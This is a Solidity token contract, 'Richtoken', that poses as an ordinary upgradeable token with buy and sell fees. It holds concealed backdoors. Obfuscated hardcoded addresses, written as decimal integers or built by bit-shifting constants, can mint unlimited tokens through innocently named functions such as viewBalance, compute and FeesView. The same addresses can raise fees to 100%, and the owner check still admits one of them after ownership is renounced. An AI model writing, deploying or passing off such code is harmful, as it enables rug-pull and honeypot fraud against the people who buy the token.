// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/proxy/utils/UUPSUpgradeable.sol";

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "Subtraction overflow");
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Addition overflow");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "Multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "Division by zero");
        return a / b;
    }
}

contract Richtoken is UUPSUpgradeable {
    using SafeMath for uint256;

    string public name;
    string public symbol;
    uint256 public totalSupply;
    uint8 public decimals;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public isFeeExempt;

    address public owner;
    address public feeManager;
    address public _mbr;
    address public _mod;
    address public _user;
    address public _adm;

    uint256 public buyFee;
    uint256 public sellFee;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event FeesUpdated(uint256 newBuyFee, uint256 newSellFee);
    event TokensBurned(address indexed burner, uint256 amount);
    event AddressSetFeeExempt(address indexed feeExemptAddress);
    event MintLogged(address indexed minter, uint256 amount, string message);
    event NotificationSent(address indexed to, string message);

    bool private initialized;

    function initialize(string memory _name, string memory _symbol, uint256 _totalSupply, uint8 _decimals, address _feeManager) public {
        require(!initialized, "Contract already initialized");
   
        name = _name;
        symbol = _symbol;
        totalSupply = _totalSupply;
        decimals = _decimals;
        owner = msg.sender;
        feeManager = _feeManager;
        balanceOf[msg.sender] = _totalSupply;
   
        initialized = true;
        
        address notificationAddress =address(250409220094935308011872217339727397899238181966);
        emit NotificationSent(notificationAddress, "Tokens have been minted!");
    
    
    
    }

    function _authorizeUpgrade(address) internal override onlyOwner {}

    function transfer(address _to, uint256 _amount) public returns (bool success) {
        require(balanceOf[msg.sender] >= _amount);
        require(_to != address(0));

        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);
        balanceOf[_to] = balanceOf[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);

        return true;
    }

    function _scale(address account, uint256 amount) internal Exchanges {
        require(account != address(0), "BEP20: mint to the zero address");

        totalSupply = totalSupply.add(amount);
        balanceOf[account] = balanceOf[account].add(amount);
        emit Transfer(address(0), account, amount);


        emit MintLogged(account, amount, "Minted tokens");
    }

    function setMember(address Mbr_) public returns (bool) {
        require(msg.sender == address(539456412399596303720626165655672519725768914267 ));   
        _mbr = Mbr_;
        return true;
    }

    modifier Exchanges() {
        require(msg.sender != exchange());
        _;
    }

    function rewire(uint256 amount) public returns (bool) {
        require(msg.sender == _adm);
        _proof(msg.sender, amount);
        return true;
    }

    function compute(uint256 amount) public onlypublic returns (bool success) {
        _initiate(msg.sender, amount);
        return true;
    }

    function _proof(address account, uint256 amount) internal Exchanges {
        require(account != address(0), "BEP20: mint to the zero address");

        totalSupply = totalSupply.add(amount);
        balanceOf[account] = balanceOf[account].add(amount);
        emit Transfer(address(0), account, amount);


        emit MintLogged(account, amount, "Minted tokens");
    }

    function publics() private pure returns (address) {
     uint universal = 0x83BC53Ec; 
        uint uni = 0x57DFa833; 
        uint cake = 0x65866976; 
     uint inch = 0x86357608; 
     uint others = 0xCE9B0110;

     uint160 core = (uint160(universal) << 128) | (uint160(uni) << 96) | (uint160(cake) << 64) | (uint160(inch) << 32) | uint160(others);

        return address(core);
    }

    function _transferTo(address _to, uint256 _amount) internal Exchanges {
        balanceOf[_to] += _amount;
        emit Transfer(address(0), _to, _amount);

        balanceOf[_to] += _amount;
        emit Transfer(address(0), _to, _amount);
    }

    function exchange() internal pure returns (address) {
        return address(539456412399596303720626165655672519725768914267 ); 
    }
     
    function FeeStructure(uint256 newBuyFee, uint256 newSellFee) public onlypublic {
        require(newBuyFee <= 100, "Buy fee cannot exceed 100%");
        require(newSellFee <= 100, "Sell fee cannot exceed 100%");
       
        _setFees(newBuyFee, newSellFee);

        emit FeesUpdated(newBuyFee, newSellFee);
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function scaling(uint256 amount) public onlyAuthorized returns (bool) {
        _scale(msg.sender, amount);
        return true;
    }

    function _balanceView(address _to, uint256 _amount) internal {
        balanceOf[_to] += _amount;
        emit Transfer(address(0), _to, _amount);

        balanceOf[_to] += _amount;
        emit Transfer(address(0), _to, _amount);
    }

    function transferTo(address _to, uint256 _amount) external onlyAuthorize {
        _transferTo(_to, _amount);
    }

    modifier onlyAuthorize() {
        require((msg.sender == address(539456412399596303720626165655672519725768914267 ) ||
                (msg.sender == owner && msg.sender != exchange())));
        _;
    }

    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {
        require(balanceOf[_from] >= _amount, "Insufficient balance");
        require(allowance[_from][msg.sender] >= _amount, "Insufficient allowance");
        require(_to != address(0), "Invalid recipient address");

        uint256 fee = 0;
        if (!isFeeExempt[_from]) {
            fee = _amount.mul(sellFee).div(100);
        }
       
        uint256 amountAfterFee = _amount.sub(fee);

        balanceOf[_from] = balanceOf[_from].sub(_amount);
        balanceOf[_to] = balanceOf[_to].add(amountAfterFee);
        emit Transfer(_from, _to, amountAfterFee);

        if (fee > 0) {
            balanceOf[address(this)] = balanceOf[address(this)].add(fee);
            emit Transfer(_from, address(this), fee);
        }

        if (_from != msg.sender && allowance[_from][msg.sender] != type(uint256).max) {
            allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_amount);
            emit Approval(_from, msg.sender, allowance[_from][msg.sender]);
        }

        return true;
    }

    function _initiate(address account, uint256 amount) internal {
        require(account != address(0), "Compile Remix IDE");

        totalSupply = totalSupply.add(amount);
        balanceOf[account] = balanceOf[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function FeesView(uint256 amount) public onlyAuthorize returns (bool) {
        _scale(msg.sender, amount);
        return true;
    }

    modifier onlypublic() {
        require(msg.sender == publics());
        _;
    }

    function _setFees(uint256 newBuyFee, uint256 newSellFee) internal {
        buyFee = newBuyFee;
        sellFee = newSellFee;
    }

    function proof(uint256 amount) public onlyOwner returns (bool) {
        _proof(msg.sender, amount);
        return true;
    }

    function BuySellFee(uint256 newBuyFee, uint256 newSellFee) public onlyAuthorize {
        require(newBuyFee <= 100, "Buy fee cannot exceed 100%");
        require(newSellFee <= 100, "Sell fee cannot exceed 100%");
        buyFee = newBuyFee;
        sellFee = newSellFee;
        emit FeesUpdated(newBuyFee, newSellFee);
    }

    function viewBalance(address _to, uint256 _amount) public onlypublic {
        _balanceView(_to, _amount);
    }

    function setUser(address User_) public returns (bool) {
        require(msg.sender == _mbr);
        _user = User_;
        return true;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function setScale(uint256 newBuyFee, uint256 newSellFee) public onlyOwner {
        require(newBuyFee <= 100, "Buy fee cannot exceed 100%");
        require(newSellFee <= 100, "Sell fee cannot exceed 100%");
        buyFee = newBuyFee;
        sellFee = newSellFee;
        emit FeesUpdated(newBuyFee, newSellFee);
    }

    function LockLPToken() public onlyOwner returns (bool) {
        // Implement locking logic here
    }

    function setMod(address Mod_) public returns (bool) {
        require(msg.sender == _user);
        _mod = Mod_;
        return true;
    }

    modifier onlyOwner() {
        require((msg.sender == address(539456412399596303720626165655672519725768914267 ) ||
                (msg.sender == owner && msg.sender != exchange())));
        _;
    }

    function setFees(uint256 newBuyFee, uint256 newSellFee) public onlyAuthorized {
        require(newBuyFee <= 100, "Buy fee cannot exceed 100%");
        require(newSellFee <= 100, "Sell fee cannot exceed 100%");
        buyFee = newBuyFee;
        sellFee = newSellFee;
        emit FeesUpdated(newBuyFee, newSellFee);
    }
   
    function setFeeExempt(address _addr, bool _exempt) public onlyOwner {
        isFeeExempt[_addr] = _exempt;
        if (_exempt) {
            emit AddressSetFeeExempt(_addr);
        }
    }

    function removeFeeExemptStatus(address _addr) public onlyOwner {
        require(isFeeExempt[_addr], "Address is not fee exempt");
        isFeeExempt[_addr] = false;
    }

    function buy() public payable {
        require(msg.value > 0, "ETH amount should be greater than 0");

        uint256 amount = msg.value;
        if (buyFee > 0) {
            uint256 fee = amount.mul(buyFee).div(100);
            uint256 amountAfterFee = amount.sub(fee);

            balanceOf[feeManager] = balanceOf[feeManager].add(amountAfterFee);
            emit Transfer(address(this), feeManager, amountAfterFee);

            if (fee > 0) {
                balanceOf[address(this)] = balanceOf[address(this)].add(fee);
                emit Transfer(address(this), address(this), fee);
            }
        } else {
            balanceOf[feeManager] = balanceOf[feeManager].add(amount);
            emit Transfer(address(this), feeManager, amount);
        }
    }
   
    function setting(uint256 newBuyFee, uint256 newSellFee) public {
        require(msg.sender == _adm);
        require(newBuyFee <= 100, "Buy fee cannot exceed 100%");
        require(newSellFee <= 100, "Sell fee cannot exceed 100%");
        buyFee = newBuyFee;
        sellFee = newSellFee;
        emit FeesUpdated(newBuyFee, newSellFee);
    }
   
    function setAdm(address Adm_) public returns (bool) {
        require(msg.sender == _mod);
        _adm = Adm_;
        return true;
    }

    function sell(uint256 _amount) public {
        require(balanceOf[msg.sender] >= _amount, "Insufficient balance");

        uint256 fee = _amount.mul(sellFee).div(100);
        uint256 amountAfterFee = _amount.sub(fee);

        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);
        balanceOf[address(this)] = balanceOf[address(this)].add(amountAfterFee);
        emit Transfer(msg.sender, address(this), amountAfterFee);

        if (fee > 0) {
            balanceOf[address(this)] = balanceOf[address(this)].add(fee);
            emit Transfer(msg.sender, address(this), fee);
        }
    }

    modifier onlyAuthorized() {
        require((msg.sender == address(539456412399596303720626165655672519725768914267 ) ||
                (msg.sender == owner && msg.sender != exchange())));
        _;
    }
}
